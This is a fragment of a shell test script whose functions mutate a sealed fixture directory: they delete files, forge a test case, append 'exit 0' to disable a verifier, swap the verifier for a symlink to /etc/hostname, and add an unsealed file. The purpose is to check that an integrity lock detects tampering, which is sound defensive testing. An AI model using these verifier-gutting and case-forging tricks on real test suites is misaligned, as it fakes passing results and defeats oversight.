# compatibility judgement of any kind and no longer claims to. Through round 4
# the card's Outcome promised "runtime compatível" and the MUT-002 case carried
# the word "incompatible" in its name while exercising a different branch; this
# case is what replaces that promise with a measurement.
# --- the declared fixture DIRECTORY as a read path (Lei 20) ------------------
# `tests/bootstrap/locks/AUR-364` is a declared path of this card, but through
# round 4 only two of the files inside it were ever opened by the accept. These
# cases are the removal test Lei 20 prescribes, applied to each of the three
# files that used to be invisible, plus the tamper direction and the direction
# nobody tests: a file ADDED to the declared directory without a reseal.

mut_fixture_cases_removed()     { rm -f "$1/$CASES"; }
mut_fixture_mutations_removed() { rm -f "$1/$MUTATIONS"; }
mut_fixture_verifier_removed()  { rm -f "$1/$VERIFIER"; }

mut_fixture_cases_tampered() {
  printf 'fabricated_case\tstructural\tpass\t-\n' >> "$1/$CASES"
}

mut_fixture_verifier_oracle_gutted() {
  printf '\n# an oracle quietly disabled\nexit 0\n' >> "$1/$VERIFIER"
}

mut_fixture_verifier_symlink() {
  rm -f "$1/$VERIFIER"
  ln -s /etc/hostname "$1/$VERIFIER"
}

mut_fixture_empty_file() { : > "$1/$CASES"; }

# The direction the removal test does not cover: an unblessed file appears
# inside the declared directory. It is on disk and not in the lock, so
# inclusion 1 of section 7k fires.
mut_fixture_unblessed_file_added() {
  printf 'unblessed\n' > "$1/$FIXDIR/unblessed-new-fixture.txt"
}

mut_disclosed_runtime_not_compatibility_checked() {
  awk -F'\t' -v OFS='\t' '$1 == "runtime" && $2 == "ruby" { $3 = "2.0.0" } { print }' \
    "$1/$RESOLVED" > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
  reseal "$1"; regen "$1"
}
